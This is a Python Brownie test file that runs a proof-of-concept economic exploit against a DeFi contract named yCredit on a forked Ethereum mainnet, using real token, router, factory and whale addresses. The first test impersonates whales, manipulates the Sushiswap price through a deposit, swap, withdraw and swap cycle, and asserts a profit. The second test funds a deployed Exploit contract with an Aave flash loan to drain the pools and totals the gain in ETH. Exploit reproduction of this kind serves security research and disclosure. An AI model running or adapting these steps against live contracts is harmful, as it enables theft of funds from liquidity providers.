import pytest
import click

configurations = {
    'dai': {'token': '0x6b175474e89094c44da98b954eedeac495271d0f', 'whale': '0x70178102AA04C5f0E54315aA958601eC9B7a4E08'},
    'usdt': {'token': '0xdac17f958d2ee523a2206206994597c13d831ec7', 'whale': '0x1062a747393198f70f71ec65a582423dba7e5ab3'},
    'usdc': {'token': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', 'whale': '0xa191e578a6736167326d05c119ce0c90849e84b7'},
    'eth': {'token': '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2', 'whale': '0x2f0b23f53734252bda2277357e97e1517d6b042a'},
    'yfi': {'token': '0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e', 'whale': '0xba37b002abafdd8e89a1995da52740bbc013d992'},
    'link': {'token': '0x514910771AF9Ca656af840dff83E8264EcF986CA', 'whale': '0x98c63b7b319dfbdf3d811530f2ab9dfe4983af9d'},
    'snx': {'token': '0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F', 'whale': '0xb671f2210b1f6621a2607ea63e6b2dc3e2464d1f'},
    'aave': {'token': '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', 'whale': '0x25f2226b597e8f9514b3f68f00f494cf4f286491'},
}

@pytest.fixture(scope='function', autouse=True)
def isolation(fn_isolation):
    pass


@pytest.mark.parametrize('config', configurations)
def test_exploit(chain, accounts, interface, config):
    whale = accounts.at(configurations[config]['whale'], force=True)
    token = interface.ERC20(configurations[config]['token'], owner=whale)
    sushiswap = interface.UniswapRouter('0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F', owner=whale)
    factory = interface.UniswapFactory('0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac', owner=whale)
    ycredit = interface.yCredit('0xe0839f9b9688a77924208ad509e29952dc660261', owner=whale)
    scale = 10 ** token.decimals()
    def print_price():
        print(
            'price', sushiswap.getAmountsOut(scale, [token, ycredit])[-1] / 1e8,
            'liquidity', token.balanceOf(factory.getPair(ycredit, token)) / scale,
        )

    print_price()
    before = token.balanceOf(whale)
    liq = token.balanceOf(factory.getPair(ycredit, token)) / scale
    amount = token.balanceOf(whale) * 0.1
    token.approve(ycredit, 2 ** 256 - 1)
    token.approve(sushiswap, 2 ** 256 - 1)
    ycredit.approve(sushiswap, 2 ** 256 - 1)
    # 1. deposit dai to ycredit
    print('deposit', amount / scale, token.symbol())
    ycredit.deposit(token, amount)
    # 2. swap dai to ycredit
    sushiswap.swapExactTokensForTokens(amount, 0, [token, ycredit], whale, chain[-1].timestamp + 1200)
    print_price()
    # 3. withdraw from ycredit
    print('ycredit', ycredit.balanceOf(whale) / 1e8)
    ycredit.withdraw(token, ycredit.balanceOf(whale) * 0.99)
    # 4. swap ycredit to dai
    sushiswap.swapExactTokensForTokens(ycredit.balanceOf(whale), 0, [ycredit, token], whale, chain[-1].timestamp + 1200)
    profit = token.balanceOf(whale) - before
    print(click.style(f'profit {profit / scale} {token.symbol()}', fg='green', bold=True))
    print_price()
    assert profit > 0, 'failed to profit'


def test_flash(accounts, interface, Exploit):
    names = set(configurations) - {'usdt'}  # TODO: add SafeERC20
    user = accounts[0]
    weth = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2'
    aave = interface.Aave('0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9', owner=user)
    sushiswap = interface.UniswapRouter('0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F')
    exploit = Exploit.deploy({'from': user})
    tokens = [interface.ERC20(configurations[name]['token']) for name in configurations if name in names]
    factory = interface.UniswapFactory('0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac', owner=user)
    ycredit = interface.yCredit('0xe0839f9b9688a77924208ad509e29952dc660261', owner=user)
    # flash with 2x the pooled amount
    amounts = [4 * token.balanceOf(factory.getPair(token, ycredit)) for token in tokens]
    modes = [0 for _ in tokens]
    tx = aave.flashLoan(exploit, tokens, amounts, modes, exploit, b'', 0)
    tx.info()
    total = 0
    for token in tokens:
        print('profit', token.balanceOf(user) / 10 ** token.decimals(), token.symbol())
        total += sushiswap.getAmountsOut(token.balanceOf(user), [token, weth])[-1] if token != weth else token.balanceOf(user)
    print('-' * 78)
    print(f'total {total / 1e18:.2f} ETH')
